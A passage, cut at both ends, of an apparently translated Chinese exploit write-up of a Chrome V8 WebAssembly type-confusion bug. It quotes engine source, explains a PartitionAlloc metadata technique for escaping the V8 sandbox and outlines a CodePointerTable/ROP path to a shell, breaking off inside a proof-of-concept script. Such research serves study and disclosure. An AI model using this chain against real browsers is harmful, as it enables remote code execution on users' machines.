class="token operator">::</span>kI31<span class="token operator">:</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kAny<span class="token operator">:</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kFunc<span class="token operator">:</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kStruct<span class="token operator">:</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kArray<span class="token operator">:</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kEq<span class="token operator">:</span>        <span class="token keyword">default</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// Make sure ValueType fits in a Smi.</span>          <span class="token function">static_assert</span><span class="token punctuation">(</span>wasm<span class="token operator">::</span>ValueType<span class="token operator">::</span>kLastUsedBit <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> kSmiValueSize<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">has_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">DCHECK_NOT_NULL</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">uint32_t</span> canonical_index <span class="token operator">=</span>                module<span class="token operator">-></span>isorecursive_canonical_type_ids<span class="token punctuation">[</span>type<span class="token punctuation">.</span><span class="token function">ref_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            type <span class="token operator">=</span> wasm<span class="token operator">::</span>ValueType<span class="token operator">::</span><span class="token function">RefMaybeNull</span><span class="token punctuation">(</span>canonical_index<span class="token punctuation">,</span>           <span class="token comment">// [!] canonical type id used as wasm::HeapType</span>                                                 type<span class="token punctuation">.</span><span class="token function">nullability</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          Node<span class="token operator">*</span> inputs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>              input<span class="token punctuation">,</span> <span class="token function">mcgraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">IntPtrConstant</span><span class="token punctuation">(</span>                         <span class="token function">IntToSmi</span><span class="token punctuation">(</span>static_cast<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">raw_bit_field</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">BuildCallToRuntimeWithContext</span><span class="token punctuation">(</span>Runtime<span class="token operator">::</span>kWasmJSToWasmObject<span class="token punctuation">,</span>                                               js_context<span class="token punctuation">,</span> inputs<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在 JS 到 Wasm 转换边界上，此函数已设置为运行。请注意，<code>canonical_index</code>引用类型的规范索引如何包装到<code>wasm::ValueType::RefMaybeNull()</code>并传递给运行时函数，<code>WasmJSToWasmObject()</code>最终达到<code>JSToWasmObject()</code>。<br><code>wasm::ValueType</code>定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// A ValueType is encoded by two components: a ValueKind and a heap</span><span class="token comment">// representation (for reference types/rtts). Those are encoded into 32 bits</span><span class="token comment">// using base::BitField. The underlying ValueKind enumeration includes four</span><span class="token comment">// elements which do not strictly correspond to value types: the two packed</span><span class="token comment">// types i8 and i16, the void type (for control structures), and a bottom value</span><span class="token comment">// (for internal use).</span><span class="token comment">// ValueType encoding includes an additional bit marking the index of a type as</span><span class="token comment">// relative. This should only be used during type canonicalization.</span>class ValueType <span class="token punctuation">&#123;</span> public<span class="token operator">:</span>  <span class="token comment">//...</span>  <span class="token keyword">static</span> constexpr ValueType <span class="token function">RefMaybeNull</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> heap_type<span class="token punctuation">,</span>                                          Nullability nullability<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">DCHECK</span><span class="token punctuation">(</span><span class="token function">HeapType</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">ValueType</span><span class="token punctuation">(</span>        KindField<span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span>nullability <span class="token operator">==</span> kNullable <span class="token operator">?</span> kRefNull <span class="token operator">:</span> kRef<span class="token punctuation">)</span> <span class="token operator">|</span>        HeapTypeField<span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                          <span class="token comment">// [!]</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//...</span>  <span class="token comment">/**************************** Static constants ******************************/</span>  <span class="token keyword">static</span> constexpr <span class="token keyword">int</span> kLastUsedBit <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>  <span class="token keyword">static</span> constexpr <span class="token keyword">int</span> kKindBits <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token keyword">static</span> constexpr <span class="token keyword">int</span> kHeapTypeBits <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>  <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">intptr_t</span> kBitFieldOffset<span class="token punctuation">;</span> private<span class="token operator">:</span>  <span class="token comment">// &#123;hash_value&#125; directly reads &#123;bit_field_&#125;.</span>  friend <span class="token class-name">size_t</span> <span class="token function">hash_value</span><span class="token punctuation">(</span>ValueType type<span class="token punctuation">)</span><span class="token punctuation">;</span>  using KindField <span class="token operator">=</span> base<span class="token operator">::</span>BitField<span class="token operator">&lt;</span>ValueKind<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> kKindBits<span class="token operator">></span><span class="token punctuation">;</span>  using HeapTypeField <span class="token operator">=</span> KindField<span class="token operator">::</span>Next<span class="token operator">&lt;</span><span class="token class-name">uint32_t</span><span class="token punctuation">,</span> kHeapTypeBits<span class="token operator">></span><span class="token punctuation">;</span>                   <span class="token comment">// [!] HeapType, 20 bits wide</span>  <span class="token comment">// Marks a type as a canonical type which uses an index relative to its</span>  <span class="token comment">// recursive group start. Used only during type canonicalization.</span>  using CanonicalRelativeField <span class="token operator">=</span> HeapTypeField<span class="token operator">::</span>Next<span class="token operator">&lt;</span>bool<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span></code></pre><p>我们现在清楚地看到，<code>heap_type</code>实际上并非设计用于存储范围为 的规范类型 ID <code>uint32_t</code>，而是设计用于存储<code>wasm::HeapType</code>– 两种类型表示（规范化类型 ID 与类型索引）之间存在混淆。由于<code>wasm::HeapType</code>始终可以用 20 位表示，因此初始化程序（和 getter，在代码片段中省略）始终将此值截断为 20 位。</p><p>这导致了第一个可利用的漏洞——JS-to-Wasm 类型检查可能会混淆规范类型 id<code>t1</code>和<code>t2``if (t1 &amp; 0xfffff) == (t2 &amp; 0xfffff)</code>。具体来说，对于经过类型检查以接收规范类型 id 的对象<code>tn = t0 + 0x100000 * n</code>其中<code>0 &lt; t0 &lt; 0x100000</code>，它会改为使用截断的执行运行时类型检查<code>t0</code>。简而言之，类型<code>t0</code>及其子类型的对象可以绕过类型检查<code>tn</code>并通过 JS-to-Wasm 转换，从而导致进一步的类型混淆。</p><p>但是还有另一个可利用的漏洞，比使用索引环绕要简单得多。代码将规范类型 id 与 混淆<code>wasm::HeapType</code>，那么是否存在将规范类型 id 误用为 的情况<code>wasm::HeapType</code>？当然有，按照调用链进行操作即可<code>JSToWasmObject()</code>：</p><pre class="language-c" data-language="c"><code class="language-c">class HeapType <span class="token punctuation">&#123;</span> public<span class="token operator">:</span>  <span class="token keyword">enum</span> <span class="token class-name">Representation</span> <span class="token operator">:</span> <span class="token class-name">uint32_t</span> <span class="token punctuation">&#123;</span>    kFunc <span class="token operator">=</span> kV8MaxWasmTypes<span class="token punctuation">,</span>  <span class="token comment">// shorthand: c</span>    kEq<span class="token punctuation">,</span>                      <span class="token comment">// shorthand: q</span>    kI31<span class="token punctuation">,</span>                     <span class="token comment">// shorthand: j</span>    kStruct<span class="token punctuation">,</span>                  <span class="token comment">// shorthand: o</span>    kArray<span class="token punctuation">,</span>                   <span class="token comment">// shorthand: g</span>    kAny<span class="token punctuation">,</span>                     <span class="token comment">//                                    // [!] top type ("any")</span>    kExtern<span class="token punctuation">,</span>                  <span class="token comment">// shorthand: a.</span>    <span class="token comment">//...</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span>namespace wasm <span class="token punctuation">&#123;</span>MaybeHandle<span class="token operator">&lt;</span>Object<span class="token operator">></span> <span class="token function">JSToWasmObject</span><span class="token punctuation">(</span>Isolate<span class="token operator">*</span> isolate<span class="token punctuation">,</span> Handle<span class="token operator">&lt;</span>Object<span class="token operator">></span> value<span class="token punctuation">,</span>                                   ValueType expected_canonical<span class="token punctuation">,</span>                                   <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> error_message<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>expected_canonical<span class="token punctuation">.</span><span class="token function">heap_representation_non_shared</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span>    <span class="token keyword">case</span> HeapType<span class="token operator">::</span>kAny<span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                          <span class="token comment">// [!] all non-null JS values allowed</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IsSmi</span><span class="token punctuation">(</span><span class="token operator">*</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">CanonicalizeSmi</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> isolate<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IsHeapNumber</span><span class="token punctuation">(</span><span class="token operator">*</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">CanonicalizeHeapNumber</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> isolate<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsNull</span><span class="token punctuation">(</span><span class="token operator">*</span>value<span class="token punctuation">,</span> isolate<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> value<span class="token punctuation">;</span>      <span class="token operator">*</span>error_message <span class="token operator">=</span> <span class="token string">"null is not allowed for (ref any)"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span></code></pre><p>这导致了第二个更简单的漏洞——JS-to-Wasm 类型检查将（截断的）规范类型 id 混淆为<code>wasm::HeapType</code>。这允许所有具有规范类型 id 的类型<code>tn = kAny + 0x100000 * n</code>（其中<code>kAny = 1000005</code>）允许 的所有子类型<code>any</code>，并且由于<code>any</code>是顶级类型，因此它包括所有内容（除了 null，我们无论如何都不需要它）。</p><p>我们有一个非常简单但强大的利用原语，因为我们在 WASM 对象之间有任意类型混淆。利用这一点来获取基本的漏洞构造（例如，笼状 RW、）<code>addrOf()</code>，<code>fakeObj()</code>在 <a href="https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome">https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome</a> 中有很好的解释——简短的总结就是造成<code>(type $t1 (struct (mut i32)))</code>、<code>(type $t2 (struct (ref $t1)))</code>和之间的混淆<code>(type $t3 (struct (exnref)))</code>（每个都对应于<code>int</code>,<code>int*</code>,<code>jsobj</code>)<br>现在剩下的就是逃离 v8 堆沙箱。与缺乏公开的技术相反，逃离 v8 堆沙箱似乎仍然是一项简单的任务 - 滥用 PartitionAlloc。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h4 id="滥用-PartitionAlloc-元数据进行任意地址写入"><a href="#滥用-PartitionAlloc-元数据进行任意地址写入" class="headerlink" title="滥用 PartitionAlloc 元数据进行任意地址写入"></a>滥用 PartitionAlloc 元数据进行任意地址写入</h4><p>PartitionAlloc 似乎是 v8 堆沙箱逃逸的一个未经充分研究的攻击向量，可能是因为它不包含在 4GB v8 指针压缩框架中。然而，它仍然在 1TB v8 堆沙箱中，很容易访问（指针压缩框架 &lt;-&gt; 堆沙箱不是安全边界），并且有大量的外部指针，这些指针可以直接使用，而没有任何有意义的缓解措施。</p><p>通过修改<code>ArrayBuffer</code>对象字段（通过<code>addrOf()</code>+ <code>caged_write()</code>），特别是<code>backing_store</code>字段，很容易获得对 PartitionAlloc 元数据的控制权。这会立即导致<code>chrome.dll</code>地址泄漏<code>SlotSpanMetadata::bucket</code>。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">SlotSpanMetadata</span> <span class="token punctuation">&#123;</span> private<span class="token operator">:</span>  PartitionFreelistEntry<span class="token operator">*</span> freelist_head <span class="token operator">=</span> nullptr<span class="token punctuation">;</span> public<span class="token operator">:</span>  <span class="token comment">// TODO(lizeb): Make as many fields as possible private or const, to</span>  <span class="token comment">// encapsulate things more clearly.</span>  SlotSpanMetadata<span class="token operator">*</span> next_slot_span <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>  PartitionBucket<span class="token operator">*</span> <span class="token keyword">const</span> bucket <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>                                        <span class="token comment">// [!] chrome.dll address leak</span>  <span class="token comment">// CHECK()ed in AllocNewSlotSpan().</span>  <span class="token comment">// The maximum number of bits needed to cover all currently supported OSes.</span>  <span class="token keyword">static</span> constexpr <span class="token class-name">size_t</span> kMaxSlotsPerSlotSpanBits <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>  <span class="token function">static_assert</span><span class="token punctuation">(</span>kMaxSlotsPerSlotSpan <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> kMaxSlotsPerSlotSpanBits<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// |marked_full| isn't equivalent to being full. Slot span is marked as full</span>  <span class="token comment">// iff it isn't on the active slot span list (or any other list).</span>  <span class="token class-name">uint32_t</span> marked_full <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// |num_allocated_slots| is 0 for empty or decommitted slot spans, which can</span>  <span class="token comment">// be further differentiated by checking existence of the freelist.</span>  <span class="token class-name">uint32_t</span> num_allocated_slots <span class="token operator">:</span> kMaxSlotsPerSlotSpanBits<span class="token punctuation">;</span>  <span class="token class-name">uint32_t</span> num_unprovisioned_slots <span class="token operator">:</span> kMaxSlotsPerSlotSpanBits<span class="token punctuation">;</span> private<span class="token operator">:</span>  <span class="token keyword">const</span> <span class="token class-name">uint32_t</span> can_store_raw_size_ <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token class-name">uint32_t</span> freelist_is_sorted_ <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token class-name">uint32_t</span> unused1_ <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> kMaxSlotsPerSlotSpanBits <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// If |in_empty_cache_|==1, |empty_cache_index| is undefined and mustn't be</span>  <span class="token comment">// used.</span>  <span class="token class-name">uint16_t</span> in_empty_cache_ <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token class-name">uint16_t</span> empty_cache_index_      <span class="token operator">:</span> kMaxEmptyCacheIndexBits<span class="token punctuation">;</span>  <span class="token comment">// &lt; kMaxFreeableSpans.</span>  <span class="token class-name">uint16_t</span> unused2_ <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> kMaxEmptyCacheIndexBits<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Can use only 48 bits (6B) in this bitfield, as this structure is embedded</span>  <span class="token comment">// in PartitionPage which has 2B worth of fields and must fit in 32B.</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span></code></pre><p>由于<code>bucket</code>稍后会取消引用并写入，因此我们将目标锁定在该字段。下面是释放对象的代码片段：</p><pre class="language-c" data-language="c"><code class="language-c">PA_ALWAYS_INLINE <span class="token keyword">void</span> SlotSpanMetadata<span class="token operator">::</span><span class="token function">Free</span><span class="token punctuation">(</span>    <span class="token class-name">uintptr_t</span> slot_start<span class="token punctuation">,</span>    PartitionRoot<span class="token operator">*</span> root<span class="token punctuation">,</span>    <span class="token keyword">const</span> PartitionFreelistDispatcher<span class="token operator">*</span> freelist_dispatcher<span class="token punctuation">)</span>    <span class="token comment">// PartitionRootLock() is not defined inside partition_page.h, but</span>    <span class="token comment">// static analysis doesn't require the implementation.</span>    <span class="token function">PA_EXCLUSIVE_LOCKS_REQUIRED</span><span class="token punctuation">(</span><span class="token function">PartitionRootLock</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_UNLIKELY</span><span class="token punctuation">(</span>marked_full <span class="token operator">||</span> num_allocated_slots <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">FreeSlowPath</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token comment">// [!] target path</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// All single-slot allocations must go through the slow path to</span>    <span class="token comment">// correctly update the raw size.</span>    <span class="token function">PA_DCHECK</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CanStoreRawSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> SlotSpanMetadata<span class="token operator">::</span><span class="token function">FreeSlowPath</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> number_of_freed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>marked_full<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span>    marked_full <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>bucket<span class="token operator">-></span>active_slot_spans_head <span class="token operator">!=</span> <span class="token function">get_sentinel_slot_span</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      next_slot_span <span class="token operator">=</span> bucket<span class="token operator">-></span>active_slot_spans_head<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bucket<span class="token operator">-></span>active_slot_spans_head <span class="token operator">=</span> this<span class="token punctuation">;</span>                      <span class="token comment">// [!] arbitrary address write</span>    <span class="token function">PA_CHECK</span><span class="token punctuation">(</span>bucket<span class="token operator">-></span>num_full_slot_spans<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Underflow.       // [!] constraint</span>    <span class="token operator">--</span>bucket<span class="token operator">-></span>num_full_slot_spans<span class="token punctuation">;</span>                              <span class="token comment">// [!] arbitrary address decr (24bit int)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>num_allocated_slots <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>this <span class="token operator">==</span> bucket<span class="token operator">-></span>active_slot_spans_head<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      bucket<span class="token operator">-></span><span class="token function">SetNewActiveSlotSpan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>bool PartitionBucket<span class="token operator">::</span><span class="token function">SetNewActiveSlotSpan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> slot_span<span class="token punctuation">;</span> slot_span <span class="token operator">=</span> next_slot_span<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    next_slot_span <span class="token operator">=</span> slot_span<span class="token operator">-></span>next_slot_span<span class="token punctuation">;</span>                 <span class="token comment">// [!] constraint: target should be zero</span>    <span class="token comment">//...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>slot_span<span class="token operator">-></span><span class="token function">is_active</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                               <span class="token comment">// [!] constraint: false on zeros</span>      <span class="token comment">//...</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>slot_span<span class="token operator">-></span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token comment">// [!] arbitrary write</span>      slot_span<span class="token operator">-></span>next_slot_span <span class="token operator">=</span> empty_slot_spans_head<span class="token punctuation">;</span>      empty_slot_spans_head <span class="token operator">=</span> slot_span<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>slot_span<span class="token operator">-></span><span class="token function">is_decommitted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      slot_span<span class="token operator">-></span>next_slot_span <span class="token operator">=</span> decommitted_slot_spans_head<span class="token punctuation">;</span>  <span class="token comment">// [!] arbitrary write</span>      decommitted_slot_spans_head <span class="token operator">=</span> slot_span<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//...</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span></code></pre><p>通过修改<code>bucket</code>字段并设置<code>marked_full</code>slot span 元数据中的位，我们可以到达代码中，在<code>FreeSlowPath()</code>那里我们可以实现任意地址写入，写入的值是元数据地址。请注意立即数<code>PA_CHECK()</code>- 这是我们的目标地址必须满足的约束。随后立即进行任意地址递减，也可以根据需要使用（例如从<code>CodePointerTables</code> 中移出 JIT 代码地址）。</p><p>这个原语可以用来做任何我们想做的事情，甚至可以凭空创造出完全任意的值——一旦<code>PA_CHECK()</code>相邻的更高地址满足了约束，我们甚至可以通过反复将值逐一减少来“拉”到我们想要写入的位置，然后反复触发减少以创建任意值。</p><p>我们还可以采用<code>PartitionBucket::SetNewActiveSlotSpan()</code>路径，其中这是攻击者控制的<code>PartitionBucket*</code>。这允许在已经写入NULL的目标指针上使用任意值进行任意写入(加上一些容易满足的约束)。当我们希望在一个巨大的零区域的中间写入任意值，而<code>PA_CHECK(bucket-&gt;num_full_slot_spans)</code>可能难以满足时，这将补充上述原语。</p><h4 id="Popping-Shell"><a href="#Popping-Shell" class="headerlink" title="Popping Shell"></a>Popping Shell</h4><p>我们已经通过任意地址写入原语绕过了 v8sbx，剩下的就是使用漏洞原语来弹出 shell。</p><p><code>CodePointerTable</code>通过劫持位于对象前方的程序即可获得完整的 RCE <code>Sandbox</code>。</p><ol><li>按要求准备ropchain、shellcode等</li><li>将 CPT 函数表基覆盖到我们控制的 ArrayBuffer 中，并用我们的 pivot gadget 填充</li><li>触发代码，通过 CPT 调用数据透视小工具（JSEntry()这是最简单的一个）</li></ol><ul><li>Gadget 将堆栈转到 ropchain，将 shellcode 区域设置为可执行文件并返回到 shellcode<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// poc.js</span><span class="token comment">// kNumberOfPredefinedTypes = 2</span><span class="token comment">// stack up 1000000 more canonicalized types (total 1000002)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// confuse argument as struct (mut i32) by aliasing canonicalized type with kAny</span><span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000002</span>  builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000003</span>  builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000004</span>  <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 &lt;- kAny</span>  <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span><span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000006</span>  builder<span class="token 